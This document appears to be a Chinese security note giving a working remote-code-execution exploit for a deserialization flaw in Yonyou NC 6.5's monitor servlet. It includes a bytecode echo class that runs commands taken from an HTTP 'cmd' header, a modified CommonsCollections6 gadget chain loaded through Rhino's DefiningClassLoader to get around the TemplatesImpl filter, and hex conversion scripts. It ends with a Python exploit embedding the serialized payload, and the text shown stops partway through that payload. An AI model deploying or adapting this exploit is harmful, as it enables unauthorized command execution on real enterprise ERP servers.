# 用友NC65反序列化回显利用
# 0x01 漏洞原理
`/service/monitorservle` 存在反序列化点。

`nc.bs.framework.mx.monitor.MonitorServlet#doAction`

<img width="1057" alt="image" src="https://user-images.githubusercontent.com/84888757/205452979-8e8a6051-3b85-44c1-b75b-ddccee9de852.png">

# 0x02 回显思路
默认安装的用友nc开启了 `jdk security` ，过滤了 `TemplatesImpl`  类，所以通过将构造的回显类塞进 `TemplatesImpl` 中的回显方法无法成功。

转换思路，动态加载字节码除了利用 `TemplatesImpl` 和 `BCEL` 还有哪些方法？

💡 利用 `ClassLoader#defineClass` 直接加载字节码

找到 `org.mozilla.javascript.DefiningClassLoader` 被加载进 `classpath`，且实现 `defineClass` 方法，所以这里可以直接用 `defineClass+tomcat` 加载恶意字节码回显。

# 0x03 构造 EXP
## 3.1 恶意类
回显参考文章：https://blog.csdn.net/fnmsd/article/details/106890242

回显类：https://gist.github.com/fnmsd/4d9ed529ceb6c2a464f75c379dadd3a8

回显类修改：[zhzhdoai](https://zhzhdoai.github.io/2020/09/17/%E6%9F%90NC-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/) 师傅提出，靶机会因为 `getWriter` 报错，给恶意类添加了 `p.getWriter().close();` 效果会好一些，手动关闭流。

![image](https://user-images.githubusercontent.com/84888757/205453503-93068035-1f2e-47fb-a320-0fc9fdc9648f.png)

![image](https://user-images.githubusercontent.com/84888757/205453507-100a83f7-5843-4058-8bab-12b22a2442d3.png)

📒 `dfs.java`

```java
package org.vulhub.nc65;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.util.HashSet;
import java.util.Scanner;


public class dfs {

    static HashSet<Object> h;
    static HttpServletRequest r;
    static HttpServletResponse p;

    public static void main(String[] args) {
        System.out.println("fuck");
        r = null;
        p = null;
        h =new HashSet<Object>();
        F(Thread.currentThread(),0);
    }

//    public dfs(){
//        System.out.println("fuck");
//        r = null;
//        p = null;
//        h =new HashSet<Object>();
//        F(Thread.currentThread(),0);
//    }

    private static boolean i(Object obj){
        if(obj==null|| h.contains(obj)){
            return true;
        }

        h.add(obj);
        return false;
    }
    private static void p(Object o, int depth){
        if(depth > 52||(r !=null&& p !=null)){
            return;
        }
        if(!i(o)){
            if(r ==null&&HttpServletRequest.class.isAssignableFrom(o.getClass())){
                r = (HttpServletRequest)o;
                if(r.getHeader("cmd")==null) {
                    r = null;
                }else{
                    try {
                        p = (HttpServletResponse) r.getClass().getMethod("getResponse").invoke(r);


                    } catch (Exception e) {
                        r = null;
                    }
                }

            }
            if(r !=null&& p !=null){
                try {

                    p.getWriter().println(new Scanner(Runtime.getRuntime().exec(r.getHeader("cmd")).getInputStream()).useDelimiter("\\A").next());
                    p.getWriter().flush();
                    p.getWriter().close();
                }catch (Exception e){
                }
                return;
            }

            F(o,depth+1);
        }
    }
    private static void F(Object start, int depth){

        Class n=start.getClass();
        do{
            for (Field declaredField : n.getDeclaredFields()) {
                declaredField.setAccessible(true);
                Object o = null;
                try{
                    o = declaredField.get(start);

                    if(!o.getClass().isArray()){
                        p(o,depth);
                    }else{
                        for (Object q : (Object[]) o) {
                            p(q, depth);
                        }

                    }

                }catch (Exception e){
                }
            }

        }while(
                (n = n.getSuperclass())!=null
        );
    }

}
```

## 3.2 使用jdk1.7.051将回显类编译为字节码
为什么要使用 `jdk1.7.051` 呢？

因为我看了[这篇文章](https://mp.weixin.qq.com/s/xVKuJb3DbKH0em0HoMZ4ZQ)里提到恶意类编译时的版本不能和用友NC用的版本差太远，我的用友NC6.5的jdk环境使用的是jdk1.7.051。

![image](https://user-images.githubusercontent.com/84888757/205453680-1d2c8b8c-5c70-4c61-8218-fe2e90237f7f.png)

编译的时候有点坑，首先你会出现 `HttpServletRequest` 找不到的问题，需要将 `/apache-tomcat-8.5.64/lib中的sevlet-api.jar` 放到 `/Library/Java/JavaVirtualMachines/jdk1.7.0_51.jdk/Contents/Home/jre/lib/ext` 中

<div align=center><img width="1035" alt="image" src="https://user-images.githubusercontent.com/84888757/205453760-75a42673-06ee-4fa0-9d10-9b291776095a.png" /></div>

然后再次编译，又会出现一个问题：`Permission denied`

解决：切换 `root` 用户

![image](https://user-images.githubusercontent.com/84888757/205453724-8fd9793f-75bd-44d0-abf6-f8b254548fb0.png)

成功了：

![image](https://user-images.githubusercontent.com/84888757/205453831-86911442-4c5d-4db6-b4d8-4b7f4aba2724.png)

`Windows` 系统下编译时遇到了新的错误：

![image](https://github.com/reidmu/sec-note/assets/84888757/ce503a84-86fd-43cf-9811-9a7b65a9534f)

解决：

```bash
D:\Java\jdk1.7.0_51\bin\javac.exe -encoding UTF-8  .\dfs.java
```

![image](https://github.com/reidmu/sec-note/assets/84888757/0656e3d9-a822-48fa-b52d-7550cde6d535)



## 3.3 字节码贴入CC6中反射调用

将字节码放到 `CC6` 中进行反射调用，大概是下面这样：

```
DefiningClassLoader.class.getDeclaredConstructor().newInstance(new Object[0]).defineClass("org.vulhub.nc65.dfs",bs).getMethod("main").invoke(null);
```

前面回显思路中说过了，发现 `org.mozilla.javascript.DefiningClassLoader` 被加载进 `classpath` ，且实现 `defineClass` 方法，所以这里可以直接用 `defineClass` 加载字节码回显。


我们需要将 `NC65_Server_home/modules/bqrtdbd/lib/js-14.jar` 放进我们的项目`lib`库里，才能正常使用 `org.mozilla.javascript.DefiningClassLoader`

将 `NC65_Server_home/modules/bqrtdbd/lib/js-14.jar` 复制到我们的 `vulhub` 项目文件夹下（就是 `cc6.java` 所在的项目文件夹啦），右键 `add as lib` 即可。

修改 `cc6` 如下,替换 `transformers` 构造，其中 `bs` 是编译好的 `dfs.class` 字节码，`org.vulhub.nc65.dfs` 可以替换为自己的包名.类。

（这里用的P神的简化版cc6）

📒 `cc6.java`

```java
package org.vulhub.nc65;


import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.mozilla.javascript.DefiningClassLoader;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

// import static org.vulhub.nc65.ClassLoaderMain.getBytesByFile;

public class cc6 {
    public static void main(String[] args) throws Exception{

        byte[] bs = getBytesByFile("/Users/devil/Codes/java/vulhub/src/main/java/org/vulhub/nc65/dfs.class");

        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};


        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(DefiningClassLoader.class),
                new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                new InvokerTransformer("defineClass",
                        new Class[]{String.class, byte[].class}, new Object[]{"org.vulhub.nc65.dfs", bs}),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"main", new Class[]{String[].class}}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{null}}),
                new ConstantTransformer(1),
        };
        //先传入一个人畜无害的fakeTransformers对象，避免本地调试时出发命令执行
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        // 创建一个map，不用添加Entry
        Map innerMap = new HashMap();

        // 调用LazyMap.decorate实例化LazyMap
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");


        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.remove("keykey");

        // ==================
        //将真正的transformers数组设置进来
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);


        // 序列化数据并写入文件
        serialize(expMap);
        // 从文件读取数据进行反序列化
//        unserialize("ser.bin");


    }

    public static void serialize(Object obj) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream("./ser.bin");
        ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
        outputStream.writeObject(obj);
        outputStream.close();
        fileOutputStream.close();
//        System.out.println();
    }

    public static void unserialize(String args) throws IOException, ClassNotFoundException {
        FileInputStream fileInputStream = new FileInputStream(args);
        ObjectInputStream ois = new ObjectInputStream(fileInputStream);

//        ois.readObject();
        System.out.println( ois.readObject());
    }

    public static byte[] getBytesByFile(String pathStr) {
        File file = new File(pathStr);
        try {
            FileInputStream fis = new FileInputStream(file);
            ByteArrayOutputStream bos = new ByteArrayOutputStream(1000);
            byte[] b = new byte[1000];
            int n;
            while ((n = fis.read(b)) != -1) {
                bos.write(b, 0, n);
            }
            fis.close();
            byte[] data = bos.toByteArray();
            bos.close();
            return data;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}

```


## 3.4 将序列化的数据文件转换输出为16进制字符串

📒 `bin2hex.py`

```python
#!/usr/bin python3
# -*- coding: utf-8 -*-

import binascii
import re
import os

def analysis(bin_path):
    with open(bin_path, 'rb') as f:
    	# 读取全部行
        all_data = f.readlines()

        hex_str16 = ""
        for line in all_data:
            # 二进制（bytes）类型转换成十六进制类型
            hex_str = binascii.b2a_hex(line).decode('unicode_escape')
            hex_str16 += str(hex_str)

    t = iter(str(hex_str16))
    begin = '\\x'
    hex_x = begin + '\\x'.join(a+b for a,b in zip(t, t))
    print(str(input_file_path) + "的16进制如下: \n")
    print(hex_x)
         
print("解析完成")
                
if __name__ == '__main__':
    input_file_path = "./ser.bin"
    analysis(input_file_path)

```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/205454090-607c6196-62b2-4c3c-90fa-6eb77aa2f9ee.png" /></div>


后来发现我写复杂了(菜🐶如我），事实上有更简单的脚本：

📒 `bin2hex_v2.py`

```python
f=open('ser.bin', 'rb')
print(f.read())
```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/205454186-2c27642f-d705-4ca6-ba3e-6f98b4c9d452.png" /></div>


## 3.5 编写exp
### 3.5.1 exp-v1

📒 `monitor_poc.py`

```python
import requests
import urllib3
import sys
import base64

def exp(url, cmd):
    data = "\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x01\x73\x72\x00\x34\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x6b\x65\x79\x76\x61\x6c\x75\x65\x2e\x54\x69\x65\x64\x4d\x61\x70\x45\x6e\x74\x72\x79\x8a\xad\xd2\x9b\x39\xc1\x1f\xdb\x02\x00\x02\x4c\x00\x03\x6b\x65\x79\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x4c\x00\x03\x6d\x61\x70\x74\x00\x0f\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4d\x61\x70\x3b\x78\x70\x74\x00\x06\x6b\x65\x79\x6b\x65\x79\x73\x72\x00\x2a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x6d\x61\x70\x2e\x4c\x61\x7a\x79\x4d\x61\x70\x6e\xe5\x94\x82\x9e\x79\x10\x94\x03\x00\x01\x4c\x00\x07\x66\x61\x63\x74\x6f\x72\x79\x74\x00\x2c\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x63\x6f\x6d\x6d\x6f\x6e\x73\x2f\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2f\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\x78\x70\x73\x72\x00\x3a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x43\x68\x61\x69\x6e\x65\x64\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x30\xc7\x97\xec\x28\x7a\x97\x04\x02\x00\x01\x5b\x00\x0d\x69\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x73\x74\x00\x2d\x5b\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x63\x6f\x6d\x6d\x6f\x6e\x73\x2f\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2f\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\x78\x70\x75\x72\x00\x2d\x5b\x4c\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\xbd\x56\x2a\xf1\xd8\x34\x18\x99\x02\x00\x00\x78\x70\x00\x00\x00\x07\x73\x72\x00\x3b\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x43\x6f\x6e\x73\x74\x61\x6e\x74\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x58\x76\x90\x11\x41\x02\xb1\x94\x02\x00\x01\x4c\x00\x09\x69\x43\x6f\x6e\x73\x74\x61\x6e\x74\x71\x00\x7e\x00\x03\x78\x70\x76\x72\x00\x2a\x6f\x72\x67\x2e\x6d\x6f\x7a\x69\x6c\x6c\x61\x2e\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x2e\x44\x65\x66\x69\x6e\x69\x6e\x67\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78\x70\x73\x72\x00\x3a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x49\x6e\x76\x6f\x6b\x65\x72\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x87\xe8\xff\x6b\x7b\x7c\xce\x38\x02\x00\x03\x5b\x00\x05\x69\x41\x72\x67\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x4c\x00\x0b\x69\x4d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x0b\x69\x50\x61\x72\x61\x6d\x54\x79\x70\x65\x73\x74\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x78\x70\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x78\x70\x00\x00\x00\x01\x75\x72\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x43\x6c\x61\x73\x73\x3b\xab\x16\xd7\xae\xcb\xcd\x5a\x99\x02\x00\x00\x78\x70\x00\x00\x00\x00\x74\x00\x16\x67\x65\x74\x44\x65\x63\x6c\x61\x72\x65\x64\x43\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x75\x71\x00\x7e\x00\x1a\x00\x00\x00\x01\x76\x71\x00\x7e\x00\x1a\x73\x71\x00\x7e\x00\x13\x75\x71\x00\x7e\x00\x18\x00\x00\x00\x01\x75\x71\x00\x7e\x00\x18\x00\x00\x00\x00\x74\x00\x0b\x6e\x65\x77\x49\x6e\x73\x74\x61\x6e\x63\x65\x75\x71\x00\x7e\x00\x1a\x00\x00\x00\x01\x76\x71\x00\x7e\x00\x18\x73\x71\x00\x7e\x00\x13\x75\x71\x00\x7e\x00\x18\x00\x00\x00\x02\x74\x00\x13\x6f\x72\x67\x2e\x76\x75\x6c\x68\x75\x62\x2e\x6e\x63\x36\x35\x2e\x64\x66\x73\x75\x72\x00\x02\x5b\x42\xac\xf3\x17\xf8\x06\x08\x54\xe0\x02\x00\x00\x78\x70\x00\x00\x0b\x9f\xca\xfe\xba\xbe\x00\x00\x00\x33\x00\xb0\x0a\x00\x17\x00\x49\x09\x00\x4a\x00\x4b\x08\x00\x4c\x0a\x00\x4d\x00\x4e\x09\x00\x2e\x00\x4f\x09\x00\x2e\x00\x50\x07\x00\x51\x0a\x00\x07\x00\x49\x09\x00\x2e\x00\x52\x0a\x00\x53\x00\x54\x0a\x00\x2e\x00\x55\x0a\x00\x07\x00\x56\x0a\x00\x07\x00\x57\x0a\x00\x2e\x00\x58\x07\x00\x59\x0a\x00\x17\x00\x5a\x0a\x00\x15\x00\x5b\x08\x00\x5c\x0b\x00\x0f\x00\x5d\x08\x00\x5e\x07\x00\x5f\x0a\x00\x15\x00\x60\x07\x00\x61\x0a\x00\x62\x00\x63\x07\x00\x64\x07\x00\x65\x0b\x00\x19\x00\x66\x07\x00\x67\x0a\x00\x68\x00\x69\x0a\x00\x68\x00\x6a\x0a\x00\x6b\x00\x6c\x0a\x00\x1c\x00\x6d\x08\x00\x6e\x0a\x00\x1c\x00\x6f\x0a\x00\x1c\x00\x70\x0a\x00\x71\x00\x4e\x0a\x00\x71\x00\x72\x0a\x00\x71\x00\x73\x0a\x00\x15\x00\x74\x0a\x00\x75\x00\x76\x0a\x00\x75\x00\x77\x0a\x00\x15\x00\x78\x0a\x00\x2e\x00\x79\x07\x00\x7a\x0a\x00\x15\x00\x7b\x07\x00\x7c\x01\x00\x01\x68\x01\x00\x13\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x48\x61\x73\x68\x53\x65\x74\x3b\x01\x00\x09\x53\x69\x67\x6e\x61\x74\x75\x72\x65\x01\x00\x27\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x48\x61\x73\x68\x53\x65\x74\x3c\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x3e\x3b\x01\x00\x01\x72\x01\x00\x27\x4c\x6a\x61\x76\x61\x78\x2f\x73\x65\x72\x76\x6c\x65\x74\x2f\x68\x74\x74\x70\x2f\x48\x74\x74\x70\x53\x65\x72\x76\x6c\x65\x74\x52\x65\x71\x75\x65\x73\x74\x3b\x01\x00\x01\x70\x01\x00\x28\x4c\x6a\x61\x76\x61\x78\x2f\x73\x65\x72\x76\x6c\x65\x74\x2f\x68\x74\x74\x70\x2f\x48\x74\x74\x70\x53\x65\x72\x76\x6c\x65\x74\x52\x65\x73\x70\x6f\x6e\x73\x65\x3b\x01\x00\x06\x3c\x69\x6e\x69\x74\x3e\x01\x00\x03\x28\x29\x56\x01\x00\x04\x43\x6f\x64\x65\x01\x00\x0f\x4c\x69\x6e\x65\x4e\x75\x6d\x62\x65\x72\x54\x61\x62\x6c\x65\x01\x00\x04\x6d\x61\x69\x6e\x01\x00\x16\x28\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x56\x01\x00\x01\x69\x01\x00\x15\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x29\x5a\x01\x00\x0d\x53\x74\x61\x63\x6b\x4d\x61\x70\x54\x61\x62\x6c\x65\x01\x00\x16\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x49\x29\x56\x07\x00\x65\x01\x00\x01\x46\x07\x00\x5f\x07\x00\x7d\x07\x00\x7e\x07\x00\x61\x01\x00\x0a\x53\x6f\x75\x72\x63\x65\x46\x69\x6c\x65\x01\x00\x08\x64\x66\x73\x2e\x6a\x61\x76\x61\x0c\x00\x37\x00\x38\x07\x00\x7f\x0c\x00\x80\x00\x81\x01\x00\x04\x66\x75\x63\x6b\x07\x00\x82\x0c\x00\x83\x00\x84\x0c\x00\x33\x00\x34\x0c\x00\x35\x00\x36\x01\x00\x11\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x48\x61\x73\x68\x53\x65\x74\x0c\x00\x2f\x00\x30\x07\x00\x85\x0c\x00\x86\x00\x87\x0c\x00\x42\x00\x40\x0c\x00\x88\x00\x3e\x0c\x00\x89\x00\x3e\x0c\x00\x3d\x00\x3e\x01\x00\x25\x6a\x61\x76\x61\x78\x2f\x73\x65\x72\x76\x6c\x65\x74\x2f\x68\x74\x74\x70\x2f\x48\x74\x74\x70\x53\x65\x72\x76\x6c\x65\x74\x52\x65\x71\x75\x65\x73\x74\x0c\x00\x8a\x00\x8b\x0c\x00\x8c\x00\x8d\x01\x00\x03\x63\x6d\x64\x0c\x00\x8e\x00\x8f\x01\x00\x0b\x67\x65\x74\x52\x65\x73\x70\x6f\x6e\x73\x65\x01\x00\x0f\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x0c\x00\x90\x00\x91\x01\x00\x10\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x07\x00\x92\x0c\x00\x93\x00\x94\x01\x00\x26\x6a\x61\x76\x61\x78\x2f\x73\x65\x72\x76\x6c\x65\x74\x2f\x68\x74\x74\x70\x2f\x48\x74\x74\x70\x53\x65\x72\x76\x6c\x65\x74\x52\x65\x73\x70\x6f\x6e\x73\x65\x01\x00\x13\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x0c\x00\x95\x00\x96\x01\x00\x11\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x53\x63\x61\x6e\x6e\x65\x72\x07\x00\x97\x0c\x00\x98\x00\x99\x0c\x00\x9a\x00\x9b\x07\x00\x9c\x0c\x00\x9d\x00\x9e\x0c\x00\x37\x00\x9f\x01\x00\x02\x5c\x41\x0c\x00\xa0\x00\xa1\x0c\x00\xa2\x00\xa3\x07\x00\xa4\x0c\x00\xa5\x00\x38\x0c\x00\xa6\x00\x38\x0c\x00\xa7\x00\xa8\x07\x00\x7e\x0c\x00\xa9\x00\xaa\x0c\x00\xab\x00\xac\x0c\x00\xad\x00\xae\x0c\x00\x35\x00\x40\x01\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x0c\x00\xaf\x00\x8b\x01\x00\x13\x6f\x72\x67\x2f\x76\x75\x6c\x68\x75\x62\x2f\x6e\x63\x36\x35\x2f\x64\x66\x73\x01\x00\x1a\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x46\x69\x65\x6c\x64\x3b\x01\x00\x17\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x46\x69\x65\x6c\x64\x01\x00\x10\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x79\x73\x74\x65\x6d\x01\x00\x03\x6f\x75\x74\x01\x00\x15\x4c\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x50\x72\x69\x6e\x74\x53\x74\x72\x65\x61\x6d\x3b\x01\x00\x13\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x50\x72\x69\x6e\x74\x53\x74\x72\x65\x61\x6d\x01\x00\x07\x70\x72\x69\x6e\x74\x6c\x6e\x01\x00\x15\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x56\x01\x00\x10\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x65\x61\x64\x01\x00\x0d\x63\x75\x72\x72\x65\x6e\x74\x54\x68\x72\x65\x61\x64\x01\x00\x14\x28\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x65\x61\x64\x3b\x01\x00\x08\x63\x6f\x6e\x74\x61\x69\x6e\x73\x01\x00\x03\x61\x64\x64\x01\x00\x08\x67\x65\x74\x43\x6c\x61\x73\x73\x01\x00\x13\x28\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x01\x00\x10\x69\x73\x41\x73\x73\x69\x67\x6e\x61\x62\x6c\x65\x46\x72\x6f\x6d\x01\x00\x14\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x29\x5a\x01\x00\x09\x67\x65\x74\x48\x65\x61\x64\x65\x72\x01\x00\x26\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x01\x00\x09\x67\x65\x74\x4d\x65\x74\x68\x6f\x64\x01\x00\x40\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x4d\x65\x74\x68\x6f\x64\x3b\x01\x00\x18\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x4d\x65\x74\x68\x6f\x64\x01\x00\x06\x69\x6e\x76\x6f\x6b\x65\x01\x00\x39\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x01\x00\x09\x67\x65\x74\x57\x72\x69\x74\x65\x72\x01\x00\x17\x28\x29\x4c\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x50\x72\x69\x6e\x74\x57\x72\x69\x74\x65\x72\x3b\x01\x00\x11\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x52\x75\x6e\x74\x69\x6d\x65\x01\x00\x0a\x67\x65\x74\x52\x75\x6e\x74\x69\x6d\x65\x01\x00\x15\x28\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x52\x75\x6e\x74\x69\x6d\x65\x3b\x01\x00\x04\x65\x78\x65\x63\x01\x00\x27\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x50\x72\x6f\x63\x65\x73\x73\x3b\x01\x00\x11\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x50\x72\x6f\x63\x65\x73\x73\x01\x00\x0e\x67\x65\x74\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x01\x00\x17\x28\x29\x4c\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x3b\x01\x00\x18\x28\x4c\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x3b\x29\x56\x01\x00\x0c\x75\x73\x65\x44\x65\x6c\x69\x6d\x69\x74\x65\x72\x01\x00\x27\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x53\x63\x61\x6e\x6e\x65\x72\x3b\x01\x00\x04\x6e\x6